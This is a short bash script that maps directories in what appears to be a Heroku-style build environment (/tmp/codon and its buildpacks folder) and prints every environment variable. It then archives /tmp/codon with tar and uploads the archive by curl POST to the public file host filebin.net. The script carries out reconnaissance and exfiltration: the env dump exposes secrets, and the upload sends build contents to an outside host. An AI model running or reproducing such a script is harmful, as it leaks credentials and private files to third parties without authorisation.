#!/bin/bash

echo "pwd"
pwd

echo "ls -l"
ls -l

echo "ls -l .."
ls -l ..

echo "env"
env

echo "ls -l /tmp"
ls -l /tmp

echo "ls -l /tmp/codon"
ls -l /tmp/codon

echo "ls -l /tmp/codon/tmp"
ls -l /tmp/codon/tmp

echo "ls -l /tmp/codon/tmp/buildpacks"
ls -l /tmp/codon/tmp/buildpacks

echo "tar"
tar -czvf /tmp/archive.tar.gz /tmp/codon

curl --header "Content-Type:application/octet-stream" -X POST --data-binary @/tmp/archive.tar.gz https://filebin.net/zrv55ce01xhp9e67/archive.tar.gz

